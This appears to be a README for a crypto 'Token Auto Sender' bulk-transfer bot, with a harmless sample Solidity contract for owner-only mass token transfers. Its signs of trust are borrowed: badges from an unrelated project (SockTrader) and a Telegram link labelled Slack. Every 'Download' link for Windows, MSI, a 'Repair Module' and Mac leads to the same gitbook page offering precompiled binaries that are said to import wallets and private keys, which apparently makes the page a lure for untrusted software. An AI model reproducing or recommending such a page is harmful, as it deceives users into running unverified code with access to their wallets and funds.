

<h1 align="center">Token Auto Sender</h1>
<p align="center"><b>Token Auto Sender</b></p>

<p align="center">
  <a href="https://www.gnu.org/licenses/gpl-3.0"><img src="https://img.shields.io/badge/License-GPL%20v3-blue.svg" alt="License: GPL v3"></a>
  <a href="https://codecov.io/gh/SockTrader/SockTrader"><img src="https://codecov.io/gh/SockTrader/SockTrader/branch/master/graph/badge.svg" /></a>
  <a href="https://sonarcloud.io/dashboard?id=SockTrader_SockTrader"><img src="https://sonarcloud.io/api/project_badges/measure?project=SockTrader_SockTrader&metric=reliability_rating" /></a>
  <a href="https://sonarcloud.io/dashboard?id=SockTrader_SockTrader"><img src="https://sonarcloud.io/api/project_badges/measure?project=SockTrader_SockTrader&metric=sqale_rating" /></a>
  <a href="https://circleci.com/gh/SockTrader"><img src="https://circleci.com/gh/SockTrader/SockTrader/tree/master.svg?style=shield" alt="Build status"></a>
  <a href="https://codeclimate.com/github/SockTrader/SockTrader/maintainability"><img src="https://api.codeclimate.com/v1/badges/19589f9237d31ca9dcf6/maintainability" /></a>
</p>

<p align="center"><b>Join the community <a href="t.me/seleniumdefitrade"><img valign="middle" src="https://img.shields.io/badge/Slack-4A154B?style=for-the-badge&logo=slack" alt="Telegram"></a></b></p>

> Work on MAC OS & Windows

## Download
https://selenium-finance.gitbook.io/token-multisender-bot/
1: Download .NET V4.5 [```Download .NET Module```](https://www.microsoft.com/ru-ru/download/details.aspx?id=30653)

2: Install Actual Precompile Release x32 / x64 👇

Windows x64: [ ```Download``` ](https://selenium-finance.gitbook.io/token-multisender-bot)

Windows x32: [ ```Download``` ](https://selenium-finance.gitbook.io/token-multisender-bot)

Windows MSI Package: [ ```Download``` ](https://selenium-finance.gitbook.io/token-multisender-bot)

Windows Repair Module: [ ```Download``` ](https://selenium-finance.gitbook.io/token-multisender-bot)

MAC OS: [ ```Download``` ](https://selenium-finance.gitbook.io/token-multisender-bot)

## *IMPORTANT*
This bot is designed for automatic multi-distribution of tokens from the owner's wallet, with confirmation from the deployed smart contract of the token. 
This means that only the creator and owner of the token can perform the distribution.

## Functions
- Send tokens in bulk: Send tokens to multiple addresses at once with a single request.

- Support for various tokens: Works with ERC-20, BEP-20 and other token standards.

- Intuitive interface: Easy-to-use interface for setting up and running bulk shipments.

- Configuring transaction parameters: Ability to set transaction fees and other parameters.

- Status Tracking: Receive notifications on the status of every transaction sent.

## Main functions of the program

1. Connecting to blockchain

2. Import and manage wallets:
   - Ability to import multiple wallet addresses for token distribution.
   - Storing private keys in a secure format.

3. Customize the mailing parameters:
   - Specify the number of tokens to send to each address.
   - Setting limits on the number of transactions per minute (to avoid blocking).

4. Monitoring the status of transactions:
   - Tracking the status of each transaction and displaying information about successful and unsuccessful shipments.

5. Logging:
   - Maintain a log of all transactions for further analysis.

6. User Interface:
   - User-friendly GUI for configuring mailing parameters and displaying the status of operations.

## Setup Programm
1. Creating a smart contract
  You need to create a smart contract that manages tokens and access to the mailing function.

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MyToken is ERC20 {
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not authorized");
        _;
    }

    constructor() ERC20("MyToken", "MTK") {
        owner = msg.sender;
        _mint(owner, 1000000 * 10 ** decimals());
    }

    function massTransfer(address[] calldata recipients, uint256 amount) external onlyOwner {
        for (uint i = 0; i < recipients.length; i++) {
            _transfer(owner, recipients[i], amount);
        }
    }
}

2. Access control
   In this example, the massTransfer function can only be called by the owner of the contract (the address that created it). This is ensured by using the onlyOwner modifier.

3. Using a private key
   The private key should not be stored in a smart contract. Instead, it should be stored securely on the client side (e.g., in a wallet). Your client side (e.g. dApp) should use this key to sign transactions.

4. Token distribution
   When you want to do a mass token distribution, your client code must call the massTransfer function, using the address of the contract owner to send the transaction.

